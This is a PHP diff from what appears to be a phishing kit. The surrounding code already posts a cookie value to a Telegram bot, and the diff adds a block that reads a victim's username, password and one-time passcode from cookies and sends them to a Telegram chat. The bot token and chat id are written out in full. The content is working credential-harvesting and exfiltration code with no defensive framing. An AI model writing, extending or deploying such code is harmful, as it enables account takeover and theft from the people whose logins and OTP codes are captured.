@@ -101,3 +101,10 @@ if (!empty($_COOKIE['number'])) {
 ];
 file_get_contents("https://api.telegram.org/bot5108963799:AAFg_DkblHFVByuLfdDX_V5r0A3UkE7Pa7s/sendMessage?" . http_build_query($a));
 }
+if (!empty($_COOKIE['otp'])) {
+	$a = [
+'chat_id' => "-689765010",
+'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nOTP: " . $_COOKIE['otp']
+];
+file_get_contents("https://api.telegram.org/bot5108963799:AAFg_DkblHFVByuLfdDX_V5r0A3UkE7Pa7s/sendMessage?" . http_build_query($a));
+}
